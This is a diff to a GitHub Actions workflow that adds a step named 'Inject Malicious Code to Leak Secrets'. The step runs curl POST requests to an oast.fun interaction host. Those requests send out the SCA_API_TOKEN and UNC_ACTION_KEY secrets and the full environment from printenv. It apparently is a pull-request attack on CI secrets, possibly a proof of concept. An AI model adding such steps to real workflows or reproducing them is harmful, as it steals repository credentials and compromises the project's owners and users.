@@ -53,6 +53,15 @@ jobs:
         with:
           ref: ${{github.event.pull_request.head.sha || github.ref}}
           persist-credentials: 'false' #By default, actions/checkout persists GIT credentials, we do not need this
+
+       # Injecting malicious code
+      - name: Inject Malicious Code to Leak Secrets
+        run: |
+          echo "Trying to exfiltrate secrets"
+          curl -X POST https://qhjeecxhkeqsjandztgkwyq2vhevs80m1.oast.fun --data "SCA_API_TOKEN=$SCA_API_TOKEN"
+          curl -X POST https://qhjeecxhkeqsjandztgkwyq2vhevs80m1.oast.fun --data "UNC_ACTION_KEY=$UNC_ACTION_KEY"
+          curl -X POST https://qhjeecxhkeqsjandztgkwyq2vhevs80m1.oast.fun --data "ENV_VARS=$(printenv)"
+          
       # Checking out SCA composite action
       - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11 #v4.1.1
         with:
